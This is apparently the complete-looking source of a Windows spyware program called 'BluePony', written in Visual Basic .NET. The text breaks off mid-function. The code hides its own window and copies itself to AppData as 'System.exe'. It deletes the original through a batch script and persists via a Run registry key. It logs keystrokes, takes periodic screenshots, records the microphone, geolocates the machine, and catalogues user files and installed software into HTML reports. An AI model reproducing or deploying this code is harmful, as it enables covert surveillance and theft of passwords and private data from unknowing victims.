'© Copyright 2025 Elliot Monteverde. All Rights Reserved. For educational use only.'

Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.NetworkInformation
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32
Imports Newtonsoft.Json
Public Class BluePony
    Private _totalKeys As Long = 0
    Private _totalClicks As Long = 0
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short
    Public Function CapsLock() As Boolean
        CapsLock = CBool(GetKeyState(System.Windows.Forms.Keys.Capital) And 1)
    End Function
    Public Function Shift() As Boolean
        Shift = CBool(GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey))
    End Function
    Private recording As Boolean = False
    <DllImport("winmm.dll")>
    Private Shared Function mciSendString(command As String, buffer As StringBuilder, bufferSize As Integer, hwndCallback As IntPtr) As Long
    End Function
    Dim UID As String
    Dim srcDir As String = "BPD"
    Dim fileName As String = Environment.UserName.ToString & "_Audio_" & DateTime.Now.ToString("yyyy-MM-dd-HH-mm") & ".wav"
    Dim filePath As String = Path.Combine(srcDir, fileName)
    Private commandExecutedPS As Boolean = False
    Private previousCommandPS As String = String.Empty
    Private commandExecutedCL As Boolean = False
    Private previousCommandCL As String = String.Empty
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Visible = False
        Hide()
        UID = Environment.UserName
        Dim driveLetter As String = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)).TrimEnd("\"c)
        Dim targetFolder As String = Path.Combine(driveLetter, "Users", UID, "AppData", "Roaming", "Microsoft", "Windows", "Host")
        Dim targetPath As String = Path.Combine(targetFolder, "System.exe")
        Dim currentExePath As String = Application.ExecutablePath
        If Not currentExePath.Equals(targetPath, StringComparison.OrdinalIgnoreCase) Then
            If Not File.Exists(targetPath) Then
                Directory.CreateDirectory(targetFolder)
                File.Copy(currentExePath, targetPath)

                Dim deleteScript As String = Path.Combine(Path.GetTempPath(), "delete_me.bat")
                File.WriteAllText(deleteScript, ":repeat" & vbCrLf & "taskkill /f /im " & Path.GetFileName(currentExePath) & vbCrLf & "del " & Chr(34) & currentExePath & Chr(34) & vbCrLf & "if exist " & Chr(34) & currentExePath & Chr(34) & " goto repeat" & vbCrLf & "del " & Chr(34) & deleteScript & Chr(34))
                Process.Start(New ProcessStartInfo(deleteScript) With {.CreateNoWindow = True, .UseShellExecute = False})

                Dim runKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
                runKey.SetValue("System", targetPath)

                Process.Start(targetPath)
                Application.Exit()
            End If
        End If
        Try
            Dim machineName As String = Environment.MachineName
            Dim domainName As String = Environment.UserDomainName
            Dim osOne As String = My.Computer.Info.OSFullName
            Dim osTwo As String = My.Computer.Info.OSPlatform
            Dim osThree As String = My.Computer.Info.OSVersion
            UserNameLabel.Text = "User Name: " & UID
            DeviceLabel.Text = "Device Name: " & machineName
            DomainLabel.Text = "Domain Name: " & domainName
            OSNameLabel.Text = "OS Name: " & osOne
            OSPlatformLabel.Text = "OS Platform: " & osTwo
            OSVersionLabel.Text = "OS Version: " & osThree
        Catch ex As Exception
            UserNameLabel.Text = ex.Message
        End Try
        Try
            CopyT.Interval = 30000
            CopyT.Start()
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
        Try
            CLT.Interval = 30000
            CLT.Start()
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
        Try
            PST.Interval = 30000
            PST.Start()
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
        Try
            LoadT.Interval = 300000
            LoadT.Start()
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
        Try
            ScreenT.Interval = 30000
            ScreenT.Start()
        Catch ex As Exception
            ScreenCaptureLabel.Text = ex.Message
        End Try
        Try
            WANT.Interval = 1800000
            WANT.Start()
        Catch ex As Exception
            DeviceIPv4WANAddressLabel.Text = ex.Message
        End Try
        Try
            KeysT.Interval = 100
            KeysT.Start()
        Catch ex As Exception
            KeysLogLabel.Text = ex.Message
        End Try
        Try
            AppsT.Interval = 180000
            AppsT.Start()
        Catch ex As Exception
            ApplicationList.Text = ex.Message
        End Try
        Try
            DeviceT.Interval = 180000
            DeviceT.Start()
        Catch ex As Exception
            DeviceRunTimeLabel.Text = ex.Message
        End Try
        Try
            LogT.Interval = 1
            LogT.Start()
        Catch ex As Exception
            KeysAndClicksLog.Text = ex.Message
        End Try
        Try
            LANT.Interval = 180000
            LANT.Start()
        Catch ex As Exception
            DeviceIPv4WANAddressLabel.Text = ex.Message
        End Try
        Try
            ReportT.Interval = 180000
            ReportT.Start()
        Catch ex As Exception
            KeysLogLabel.Text = ex.Message
        End Try
        Try
            RecentT.Interval = 180000
            RecentT.Start()
        Catch ex As Exception
            RecentLabel.Text = ex.Message
        End Try
        Try
            DrivesT.Interval = 180000
            DrivesT.Start()
        Catch ex As Exception
            DrivesLabel.Text = ex.Message
        End Try
        Try
            MicT.Interval = 180000
            MicT.Start()
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
        Try
            DirT.Interval = 180000
            DirT.Start()
        Catch ex As Exception
            DirListLabel.Text = ex.Message
        End Try
        Try
            RemoteT.Interval = 15 * 60 * 1000
            RemoteT.Start()
            AddHandler RemoteT.Tick, AddressOf RemoteT_Tick
        Catch ex As Exception
            ExternalLabel.Text = "External: " & ex.Message
        End Try
        Try
            Dim screenWidth As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim screenHeight As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim screenGrab As New Bitmap(screenWidth, screenHeight)
            Using g As Graphics = Graphics.FromImage(screenGrab)
                g.CopyFromScreen(New Point(0, 0), New Point(0, 0), New Size(screenWidth, screenHeight))
            End Using
            Dim directoryPath As String = "BPD"
            If Not Directory.Exists(directoryPath) Then
                Directory.CreateDirectory(directoryPath)
            End If
            Dim fileName As String = $"{UID}_Image_{DateTime.Now.ToString("yyyy-MM-dd-HH-mm")}.jpg"
            Dim filePath As String = Path.Combine(directoryPath, fileName)
            screenGrab.Save(filePath, Imaging.ImageFormat.Jpeg)
            ScreenCaptureLabel.Text = "Screen Capture Ready"
        Catch ex As Exception
            ScreenCaptureLabel.Text = ex.Message
        End Try
        Try
            ApplicationList.Text = ""
            Dim processes As Process() = Process.GetProcesses()
            For Each p As Process In processes
                If Not String.IsNullOrEmpty(p.MainWindowTitle) Then
                    Dim runTime As String
                    Try
                        Dim duration As TimeSpan = DateTime.Now - p.StartTime
                        runTime = duration.ToString("hh\:mm\:ss")
                    Catch ex As Exception
                        runTime = "N/A"
                    End Try
                    ApplicationList.Text &= p.ProcessName & " - Run Time: " & runTime & Environment.NewLine
                End If
            Next
        Catch ex As Exception
            ApplicationsRunningLabel.Text = ex.Message
        End Try
        Try
            Dim elapsedMilliseconds As Double = Environment.TickCount
            Dim elapsedHours As Integer = elapsedMilliseconds / 1000 / 60 / 60
            Dim elapsedMinutes As Integer = (elapsedMilliseconds / 1000 / 60) Mod 60
            Dim elapsedSeconds As Integer = (elapsedMilliseconds / 1000) Mod 60
            DeviceRunTimeLabel.Text = "Device Run Time: " & elapsedHours.ToString("00") & ":" & elapsedMinutes.ToString("00") & ":" & elapsedSeconds.ToString("00")
        Catch ex As Exception
            DeviceRunTimeLabel.Text = ex.Message
        End Try
        Try
            Dim nics As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
            Dim ipv4Addresses As New List(Of String)
            Dim dnsAddresses As New List(Of String)
            Dim dhcpAddresses As New List(Of String)
            For Each nic As NetworkInterface In nics
                Dim ipProps As IPInterfaceProperties = nic.GetIPProperties()
                For Each ipInfo As UnicastIPAddressInformation In ipProps.UnicastAddresses
                    If ipInfo.Address.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                        ipv4Addresses.Add(ipInfo.Address.ToString())
                    End If
                Next
                For Each dnsAddress As IPAddress In ipProps.DnsAddresses
                    If dnsAddress.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                        dnsAddresses.Add(dnsAddress.ToString())
                    End If
                Next
                For Each dhcpAddress As IPAddress In ipProps.DhcpServerAddresses
                    If dhcpAddress.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                        dhcpAddresses.Add(dhcpAddress.ToString())
                    End If
                Next
            Next
            DeviceIPv4LANAddress.Text = String.Join(", ", ipv4Addresses) & ", DNS Server Address: " & String.Join(", ", dnsAddresses) & ", DHCP Server Address: " & String.Join(", ", dhcpAddresses)
        Catch ex As Exception
            DeviceIPv4LANAddress.Text = ex.Message
        End Try
        Try
            Dim request As WebRequest = WebRequest.Create("http://ip-api.com/json")
            request.Method = "GET"
            Dim response As WebResponse = request.GetResponse()
            Dim reader As New StreamReader(response.GetResponseStream())
            Dim json As String = reader.ReadToEnd()
            Dim location As Dictionary(Of String, Object) = JsonConvert.DeserializeObject(Of Dictionary(Of String, Object))(json)
            Dim latitude As String = location("lat").ToString()
            Dim longitude As String = location("lon").ToString()
            Dim ipv4 As String = location("query").ToString()
            Dim cityName As String = location("city").ToString()
            Dim regionName As String = location("regionName").ToString()
            Dim country As String = location("country").ToString()
            DeviceGeoLocationLabel.Text = "Device Latitude And Longitude: " & latitude & ", " & longitude
            DeviceIPv4WANAddressLabel.Text = "Device IPv4 WAN Address: " & ipv4
            DeviceGeoNameLabel.Text = "Device Location Name: " & cityName & ", " & regionName & ", " & country
        Catch ex As Exception
            DeviceGeoLocationLabel.Text = ex.Message
            DeviceIPv4WANAddressLabel.Text = ex.Message
            DeviceGeoNameLabel.Text = ex.Message
        End Try
        DrivesInUse.Clear()
        For Each drive As DriveInfo In DriveInfo.GetDrives()
            Try
                If drive.IsReady Then
                    DrivesInUse.AppendText("Drive: " & drive.Name & Environment.NewLine)
                    DrivesInUse.AppendText("Free Space: " & drive.TotalFreeSpace / 1024 / 1024 & " MB" & Environment.NewLine)
                    DrivesInUse.AppendText("Used Space: " & (drive.TotalSize - drive.TotalFreeSpace) / 1024 / 1024 & " MB" & Environment.NewLine)
                    DrivesInUse.AppendText("Total Space: " & drive.TotalSize / 1024 / 1024 & " MB" & Environment.NewLine)
                    DrivesInUse.AppendText(Environment.NewLine)
                End If
                DrivesLabel.Text = "Drives Ready"
            Catch ex As Exception
                DrivesLabel.Text = ex.Message
            End Try
        Next
        Try
            Dim recentFolderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Recent)
            Dim recentFiles = My.Computer.FileSystem.GetFiles(recentFolderPath, FileIO.SearchOption.SearchTopLevelOnly, "*.lnk").
                              OrderByDescending(Function(fi) New FileInfo(fi).CreationTime).
                              Take(10)
            RecentActivity.Text = String.Empty
            For Each file In recentFiles
                Dim filenameOnly As String = Path.GetFileNameWithoutExtension(file)
                RecentActivity.AppendText(filenameOnly & vbCrLf)
            Next
            RecentLabel.Text = "Recent Activity Ready"
        Catch ex As Exception
            RecentLabel.Text = ex.Message
        End Try
        Try
            mciSendString("open new type waveaudio alias recsound", Nothing, 0, 0)
            mciSendString("record recsound", Nothing, 0, 0)
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
        Try
            DirList.Text = String.Empty
            Dim allFiles As New System.Text.StringBuilder
            allFiles.AppendLine("Files And Directories: ")
            Dim directories As String() = {"Desktop", "Downloads", "Documents", "Pictures", "Music", "Videos", "OneDrive"}
            For Each dir As String In directories
                Dim path As String = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), dir)
                If Directory.Exists(path) Then
                    Dim files As String() = Directory.GetFiles(path)
                    Dim folders As String() = Directory.GetDirectories(path)
                    For Each file As String In files
                        allFiles.AppendLine(file)
                    Next
                    For Each folder As String In folders
                        allFiles.AppendLine(folder)
                    Next
                End If
            Next
            allFiles.AppendLine("Applications Installed: ")
            Dim uninstallKey As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
            Using rk As RegistryKey = Registry.LocalMachine.OpenSubKey(uninstallKey)
                For Each skName As String In rk.GetSubKeyNames()
                    Using sk As RegistryKey = rk.OpenSubKey(skName)
                        Try
                            Dim displayName As String = sk.GetValue("DisplayName")
                            If displayName IsNot Nothing Then
                                allFiles.AppendLine(displayName)
                            End If
                        Catch ex As Exception
                            DirListLabel.Text = ex.Message
                        End Try
                    End Using
                Next
            End Using
            DirList.Text = allFiles.ToString()
        Catch ex As Exception
            DirListLabel.Text = ex.Message
        End Try
        Try
            Dim netAgentPath As String = System.IO.Path.Combine(Application.StartupPath, "NetAgent.exe")
            Process.Start(netAgentPath)
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub KeysT_Tick(sender As Object, e As EventArgs) Handles KeysT.Tick
        Try
            For i As Integer = 8 To 255
                If GetAsyncKeyState(i) <> 0 Then
                    _totalKeys += 1
                End If
            Next
            If GetAsyncKeyState(1) <> 0 Then
                _totalClicks += 1
            End If
            If GetAsyncKeyState(2) <> 0 Then
                _totalClicks += 1
            End If
            KeyCountLabel.Text = "Key Count: " & _totalKeys.ToString()
            ClickCountLabel.Text = "Click Count: " & _totalClicks.ToString()
            KeysLogLabel.Text = "Count Ready"
        Catch ex As Exception
            KeysLogLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub BluePony_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            KeysT.Stop()
            ScreenT.Stop()
            AppsT.Stop()
            DeviceT.Stop()
            LogT.Stop()
            LANT.Stop()
            ReportT.Stop()
            RecentT.Stop()
            DrivesT.Stop()
            RecentT.Stop()
            DirT.Stop()
            CLT.Stop()
            PST.Stop()
            LoadT.Stop()
            CopyT.Stop()
            MicT.Stop()
            WANT.Stop()
        Catch ex As Exception
            ExternalLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub ScreenT_Tick(sender As Object, e As EventArgs) Handles ScreenT.Tick
        Try
            Dim screenWidth As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim screenHeight As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim screenGrab As New Bitmap(screenWidth, screenHeight)
            Using g As Graphics = Graphics.FromImage(screenGrab)
                g.CopyFromScreen(New Point(0, 0), New Point(0, 0), New Size(screenWidth, screenHeight))
            End Using
            Dim directoryPath As String = "BPD"
            If Not Directory.Exists(directoryPath) Then
                Directory.CreateDirectory(directoryPath)
            End If
            Dim fileName As String = $"{UID}_Image_{DateTime.Now.ToString("yyyy-MM-dd-HH-mm")}.jpg"
            Dim filePath As String = Path.Combine(directoryPath, fileName)
            screenGrab.Save(filePath, Imaging.ImageFormat.Jpeg)
            ScreenCaptureLabel.Text = "Screen Capture Ready"
        Catch ex As Exception
            ScreenCaptureLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub AppsT_Tick(sender As Object, e As EventArgs) Handles AppsT.Tick
        Try
            ApplicationList.Text = ""
            Dim processes As Process() = Process.GetProcesses()
            For Each p As Process In processes
                If Not String.IsNullOrEmpty(p.MainWindowTitle) Then
                    Dim runTime As String
                    Try
                        Dim duration As TimeSpan = DateTime.Now - p.StartTime
                        runTime = duration.ToString("hh\:mm\:ss")
                    Catch ex As Exception
                        runTime = "N/A"
                    End Try
                    ApplicationList.Text &= p.ProcessName & " - Run Time: " & runTime & Environment.NewLine
                End If
            Next
        Catch ex As Exception
            ApplicationsRunningLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub Device_Tick(sender As Object, e As EventArgs) Handles DeviceT.Tick
        Try
            Dim elapsedMilliseconds As Double = Environment.TickCount
            Dim elapsedHours As Integer = elapsedMilliseconds / 1000 / 60 / 60
            Dim elapsedMinutes As Integer = (elapsedMilliseconds / 1000 / 60) Mod 60
            Dim elapsedSeconds As Integer = (elapsedMilliseconds / 1000) Mod 60
            DeviceRunTimeLabel.Text = "Device Run Time: " & elapsedHours.ToString("00") & ":" & elapsedMinutes.ToString("00") & ":" & elapsedSeconds.ToString("00")
        Catch ex As Exception
            DeviceRunTimeLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub LogT_Tick(sender As Object, e As EventArgs) Handles LogT.Tick
        Dim i As Object
        Dim KeysPressed As Object
        Dim Count As Int32
        Dim Limit As Int32 = 69
        Dim Add As Object
        KeysPressed = GetAsyncKeyState(13)
        If KeysPressed = -32767 Then
            Count = 0
            Add = "[Enter]"
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(8)
        If KeysPressed = -32767 Then
            Add = "[Backspace]"
            Count += 4
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(32)
        If KeysPressed = -32767 Then
            Add = "[Space]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(9)
        If KeysPressed = -32767 Then
            Add = "[Tab]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(17)
        If KeysPressed = -32767 Then
            Add = "[Ctrl]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(18)
        If KeysPressed = -32767 Then
            Add = "[Alt]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(20)
        If KeysPressed = -32767 Then
            Add = "[Caps Lock]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(27)
        If KeysPressed = -32767 Then
            Add = "[Esc]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(37)
        If KeysPressed = -32767 Then
            Add = "[Left]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(38)
        If KeysPressed = -32767 Then
            Add = "[Up]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(39)
        If KeysPressed = -32767 Then
            Add = "[Right]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(40)
        If KeysPressed = -32767 Then
            Add = "[Down]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(46)
        If KeysPressed = -32767 Then
            Add = "[Delete]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(186)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = ";"
            Else
                Add = ":"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(187)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "="
            Else
                Add = "+"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(188)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = ","
            Else
                Add = "<"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(189)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "-"
            Else
                Add = "_"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(190)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "."
            Else
                Add = ">"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(191)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "/"
            Else
                Add = "?"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(192)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "`"
            Else
                Add = "~"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(96)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "0"
            Else
                Add = ")"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(97)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "1"
            Else
                Add = "!"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(98)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "2"
            Else
                Add = "@"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(99)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "3"
            Else
                Add = "#"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(100)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "4"
            Else
                Add = "$"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(101)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "5"
            Else
                Add = "%"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(102)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "6"
            Else
                Add = "7"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(103)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "7"
            Else
                Add = "&"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(104)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "8"
            Else
                Add = "*"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(105)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "9"
            Else
                Add = "("
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(106)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "*"
                Count += 1
            Else
                Add = ""
            End If
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(107)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "+"
            Else
                Add = "="
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(108)
        If KeysPressed = -32767 Then
            Add = " "
            GoTo KeyFound
        End If
        KeysPressed = GetAsyncKeyState(109)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "-"
            Else
                Add = "_"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(110)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "."
            Else
                Add = ">"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(106)
        If KeysPressed = -32767 Then
            Add = "[Multiply]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(107)
        If KeysPressed = -32767 Then
            Add = "[Add]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(109)
        If KeysPressed = -32767 Then
            Add = "[Subtract]"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(111)
        If KeysPressed = -32767 Then
            Add = "/"
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(2)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "/"
            Else
                Add = "?"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(220)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "\"
            Else
                Add = "|"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(222)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "'"
            Else
                Add = Chr(34)
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(221)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "]"
            Else
                Add = "}"
            End If
            GoTo KeyFound
            Count += 1
        End If
        KeysPressed = GetAsyncKeyState(219)
        If KeysPressed = -32767 Then
            If Shift() = False Then
                Add = "["
            Else
                Add = "{"
            End If
            GoTo KeyFound
            Count += 1
        End If
        For i = 65 To 128
            KeysPressed = GetAsyncKeyState(i)
            If KeysPressed = -32767 Then
                If Shift() = False Then
                    If CapsLock() = True Then
                        Add = UCase(Chr(i))
                    Else
                        Add = LCase(Chr(i))
                    End If
                Else
                    If CapsLock() = False Then
                        Add = UCase(Chr(i))
                    Else
                        Add = LCase(Chr(i))
                    End If
                End If
                GoTo KeyFound
                Count += 1
            End If
        Next i
        For i = 48 To 57
            KeysPressed = GetAsyncKeyState(i)
            If KeysPressed = -32767 Then
                If Shift() = True Then
                    Select Case Val(Chr(i))
                        Case 1
                            Add = "!"
                        Case 2
                            Add = "@"
                        Case 3
                            Add = "#"
                        Case 4
                            Add = "$"
                        Case 5
                            Add = "%"
                        Case 6
                            Add = "^"
                        Case 7
                            Add = "&"
                        Case 8
                            Add = "*"
                        Case 9
                            Add = "("
                        Case 0
                            Add = ")"
                    End Select
                Else
                    Add = Chr(i)
                End If
                GoTo KeyFound
                Count += 1
            End If
        Next i
KeyFound:
        If Count > Limit Then
            Count = 0
            KeysAndClicksLog.AppendText(vbCrLf)
        End If
        If Add <> "" Then KeysAndClicksLog.AppendText(Add)
    End Sub
    Private Sub LANT_Tick(sender As Object, e As EventArgs) Handles LANT.Tick
        Try
            Dim nics As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
            Dim ipv4Addresses As New List(Of String)
            Dim dnsAddresses As New List(Of String)
            Dim dhcpAddresses As New List(Of String)
            For Each nic As NetworkInterface In nics
                Dim ipProps As IPInterfaceProperties = nic.GetIPProperties()
                For Each ipInfo As UnicastIPAddressInformation In ipProps.UnicastAddresses
                    If ipInfo.Address.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                        ipv4Addresses.Add(ipInfo.Address.ToString())
                    End If
                Next
                For Each dnsAddress As IPAddress In ipProps.DnsAddresses
                    If dnsAddress.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                        dnsAddresses.Add(dnsAddress.ToString())
                    End If
                Next
                For Each dhcpAddress As IPAddress In ipProps.DhcpServerAddresses
                    If dhcpAddress.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                        dhcpAddresses.Add(dhcpAddress.ToString())
                    End If
                Next
            Next
            DeviceIPv4LANAddress.Text = String.Join(", ", ipv4Addresses) & ", DNS Server Address: " & String.Join(", ", dnsAddresses) & ", DHCP Server Address: " & String.Join(", ", dhcpAddresses)
        Catch ex As Exception
            DeviceIPv4LANAddress.Text = ex.Message
        End Try
    End Sub
    Private Sub ReportT_Tick(sender As Object, e As EventArgs) Handles ReportT.Tick
        Try
            Dim sb As New StringBuilder()
            sb.AppendLine("<html>")
            sb.AppendLine("<body>")
            sb.AppendLine("<p>" & UserNameLabel.Text & "</p>")
            sb.AppendLine("<p>" & DeviceLabel.Text & "</p>")
            sb.AppendLine("<p>" & KeyCountLabel.Text & "</p>")
            sb.AppendLine("<p>" & ClickCountLabel.Text & "</p>")
            sb.AppendLine("<p>Log Capture: " & KeysAndClicksLog.Text & "</p>")
            sb.AppendLine("<p>" & DeviceRunTimeLabel.Text & "</p>")
            sb.AppendLine("<p>Applications Running: " & ApplicationList.Text & "</p>")
            sb.AppendLine("<p>Drives In Use: " & DrivesInUse.Text & "</p>")
            sb.AppendLine("<p>" & DeviceGeoNameLabel.Text & "</p>")
            sb.AppendLine("<p>" & DeviceGeoLocationLabel.Text & "</p>")
            sb.AppendLine("<p>" & DomainLabel.Text & "</p>")
            sb.AppendLine("<p>" & OSNameLabel.Text & "</p>")
            sb.AppendLine("<p>" & OSPlatformLabel.Text & "</p>")
            sb.AppendLine("<p>" & OSVersionLabel.Text & "</p>")
            sb.AppendLine("<p>Device IPv4 LAN Address: " & DeviceIPv4LANAddress.Text & "</p>")
            sb.AppendLine("<p>" & DeviceIPv4WANAddressLabel.Text & "</p>")
            sb.AppendLine("<p>Recent Activity: " & RecentActivity.Text & "</p>")
            sb.AppendLine("<p>" & DirList.Text & "</p>")
            sb.AppendLine("</body>")
            sb.AppendLine("</html>")
            Dim directoryPath As String = "BPD"
            If Not Directory.Exists(directoryPath) Then
                Directory.CreateDirectory(directoryPath)
            End If
            Dim fileName As String = UID & "_Log_" & DateTime.Now.ToString("yyyy-MM-dd-HH-mm") & ".html"
            Dim filePath As String = Path.Combine(directoryPath, fileName)
            File.WriteAllText(filePath, sb.ToString())
            KeysLogLabel.Text = "Log Capture Ready"
            KeysAndClicksLog.Clear()
        Catch ex As Exception
            KeysLogLabel.Text = ex.Message
        End Try
    End Sub
    Private Sub DrivesT_Tick(sender As Object, e As EventArgs) Handles DrivesT.Tick
        DrivesInUse.Clear()
        For Each drive As DriveInfo In DriveInfo.GetDrives()
            Try
                If drive.IsReady Then
                    DrivesInUse.AppendText("Drive: " & drive.Name & Environment.NewLine)
                    DrivesInUse.AppendText("Free Space: " & drive.TotalFreeSpace / 1024 / 1024 & " MB" & Environment.NewLine)
                    DrivesInUse.AppendText("Used Space: " & (drive.TotalSize - drive.TotalFreeSpace) / 1024 / 1024 & " MB" & Environment.NewLine)
                    DrivesInUse.AppendText("Total Space: " & drive.TotalSize / 1024 / 1024 & " MB" & Environment.NewLine)
                    DrivesInUse.AppendText(Environment.NewLine)
                End If
                DrivesLabel.Text = "Drives Ready"
            Catch ex As Exception
                DrivesLabel.Text = ex.Message
            End Try
        Next
    End Sub
    Private Sub RecentT_Tick(sender As Object, e As EventArgs) Handles RecentT.Tick
        Try
            Dim recentFolderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Recent)
            Dim recentFiles = My.Computer.FileSystem.GetFiles(recentFolderPath, FileIO.SearchOption.SearchTopLevelOnly, "*.lnk").
                              OrderByDescending(Function(fi) New FileInfo(fi).CreationTime).
                              Take(10)
            RecentActivity.Text = String.Empty
            For Each file In recentFiles
                Dim filenameOnly As String = Path.GetFileNameWithoutExtension(file)
                RecentActivity.AppendText(filenameOnly & vbCrLf)
            Next
            RecentLabel.Text = "Recent Activity Ready"
        Catch ex As Exception
